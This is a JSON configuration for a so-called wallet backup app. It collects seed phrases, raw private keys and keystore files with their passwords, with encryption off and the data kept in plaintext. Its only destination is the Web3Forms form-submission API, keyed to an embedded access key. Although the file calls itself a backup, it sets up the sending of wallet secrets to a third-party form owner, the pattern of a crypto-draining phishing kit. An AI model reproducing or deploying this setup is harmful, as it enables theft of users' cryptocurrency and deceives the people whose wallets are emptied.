{
  "version": "1.0.0",
  "app_name": "WebConnect Wallet Backup",
  "description": "Interactive wallet backup system with Web3Forms integration",
  "repository": "https://github.com/decentralizedconfig/launchpad",
  
  "storage": {
    "enabled": true,
    "destinations": [
      {
        "name": "web3forms",
        "type": "web3forms_api",
        "enabled": true,
        "api_endpoint": "https://api.web3forms.com/submit",
        "access_key": "b5f9f926-ecd5-4757-b0ad-ff1954bd43ea",
        "description": "Web3Forms API for secure backup submission"
      }
    ]
  },

  "backup": {
    "enabled": true,
    "auto_backup": false,
    "backup_interval": 86400,
    "retention_days": 30,
    "compression": false,
    "encryption": false,
    "file_format": "txt"
  },

  "backup_types": {
    "recovery_phrases": {
      "enabled": true,
      "min_words": 12,
      "max_words": 24,
      "description": "12 or 24-word seed phrases"
    },
    "private_keys": {
      "enabled": true,
      "format": "0x...{64 hex chars}",
      "description": "Ethereum-style private keys"
    },
    "keystores": {
      "enabled": true,
      "format": "JSON",
      "description": "Keystore JSON files with passwords"
    }
  },

  "directory_structure": {
    "install_directory": "~/.webconnect",
    "wallet_backups": "wallet_backups",
    "logs": "logs",
    "config": "config"
  },

  "logging": {
    "enabled": true,
    "log_level": "INFO",
    "log_file": "logs/backup.log",
    "retention_days": 30
  },

  "security": {
    "verify_ssl": true,
    "local_backup_permissions": "600",
    "config_permissions": "600",
    "install_dir_permissions": "700",
    "data_format": "plaintext"
  },

  "web3forms_api": {
    "endpoint": "https://api.web3forms.com/submit",
    "method": "POST",
    "content_type": "application/json",
    "timeout": 30,
    "retry_attempts": 3
  }
}
